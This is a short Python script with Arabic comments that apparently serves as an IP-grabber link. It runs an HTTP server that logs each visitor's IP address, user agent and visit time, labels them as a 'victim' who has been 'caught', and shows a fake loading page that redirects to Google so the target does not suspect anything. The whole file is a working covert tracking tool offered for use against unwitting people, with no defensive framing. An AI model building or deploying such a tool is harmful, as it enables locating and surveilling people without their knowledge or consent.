from http.server import HTTPServer, BaseHTTPRequestHandler
import datetime

class TargetLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        # استخراج بيانات الضحية
        ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        user_agent = self.headers.get('User-Agent')
        time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        print("\n" + "="*40)
        print("[+] تم اصطياد الضحية بنجاح!")
        print(f"الوقت: {time_now}")
        print(f"IP الضحية: {ip}")
        print(f"جهاز ومتصفح الضحية: {user_agent}")
        print("="*40 + "\n")
        
        # صفحة وهمية تظهر للضحية لكي لا يشك (مثلاً صفحة تحميل أو ترحيب)
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        page_content = """
        <html>
        <head><title>Loading...</title></head>
        <body style="text-align:center; margin-top:20vh; font-family:sans-serif;">
            <h2>جاري تحميل المحتوى، يرجى الانتظار...</h2>
            <script>
                setTimeout(function(){
                    window.location.href = "https://www.google.com";
                }, 2000);
            </script>
        </body>
        </html>
        """
        self.wfile.write(page_content.encode('utf-8'))

def run():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, TargetLogger)
    print("[*] الخادم يعمل الآن... بانتظار اتصال الضحية عبر الرابط الخارجي.")
    httpd.serve_forever()

if __name__ == '__main__':
    run()

